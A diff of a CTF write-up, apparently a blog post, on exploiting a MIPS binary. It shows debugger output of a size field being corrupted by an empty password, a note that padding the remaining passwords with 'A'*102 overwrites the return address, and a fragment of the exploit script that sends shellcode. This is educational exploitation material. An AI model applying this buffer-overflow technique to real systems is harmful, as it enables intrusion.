@@ -154,14 +154,14 @@ gef➤  p/x $a0-4
 0x7fff62d8
 gef➤  x/x 0x7fff62d8
 0x7fff62d8:     0x0000000d   # << current size, before the call to read_passwords(
-gef➤  advance *0x004019c4 
+gef➤  advance *0x004019c4
                              # << enter an empty first password (only \n)
 gef➤  x/x 0x7fff62d8
 0x7fff62d8:     0x0000000a   # << new size, after the call
 {% endhighlight %}
 
 And if we populate the 12 remaining passwords with "A"*102 the return address
-(`$ra` register) gets corrupted, which we can observe by asking to exit:
+(`$ra` register) gets corrupted, which we can observe by taking the exit:
 
 ![](https://i.imgur.com/INggKTu.png)
 
@@ -320,12 +320,12 @@ r.send(sc)
 {% endhighlight %}
 
 >
-> **Update**: as [@0xGrimmlin](https://twitter.com/0xGrimmlin) [mentioned](https://twitter.com/0xGrimmlin/status/824959540349112321), during the CTF, 
+> **Update**: as [@0xGrimmlin](https://twitter.com/0xGrimmlin) [mentioned](https://twitter.com/0xGrimmlin/status/824959540349112321), during the CTF,
 > the challenge was actually QEMU chroot-ed, so technically this shellcode would
-> not have worked, but you could similarly build another one doing 
-> open/read/write(stdout)  
-> 
- 
+> not have worked, but you could similarly build another one doing
+> open/read/write(stdout)
+>
+
 #### Fire ####
 
 We have now all the components to launch our exploit. The final version is
